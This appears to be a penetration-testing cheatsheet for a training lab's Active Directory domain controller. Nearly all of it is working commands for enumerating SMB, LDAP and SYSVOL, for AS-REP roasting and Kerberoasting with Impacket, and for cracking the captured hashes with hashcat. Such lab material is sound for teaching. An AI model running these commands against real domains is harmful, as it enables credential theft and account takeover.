# Cheatsheet — First Contact

## Targets

- **dc01** — corp.pentrain.local domain controller

## Useful commands

```bash
netexec smb <dc01> --shares
enum4linux-ng <dc01>
ldapsearch -x -H ldap://<dc01> -b 'dc=corp,dc=pentrain,dc=local'
smbclient //<dc01>/SYSVOL -U guest%       # domain-readable scripts

# the two roasts
impacket-GetNPUsers -no-pass -usersfile users.txt corp.pentrain.local/
impacket-GetUserSPNs corp.pentrain.local/user:pass -request

# crack
hashcat -m 18200 asrep.txt <wordlist>     # AS-REP
hashcat -m 13100 tgs.txt <wordlist>       # Kerberoast
```

## Concepts

- No-preauth accounts give up their hash to *anyone* — no creds needed
- SPN accounts give up a crackable TGS to any *authenticated* user
- SYSVOL is group-policy public space — always check scripts/
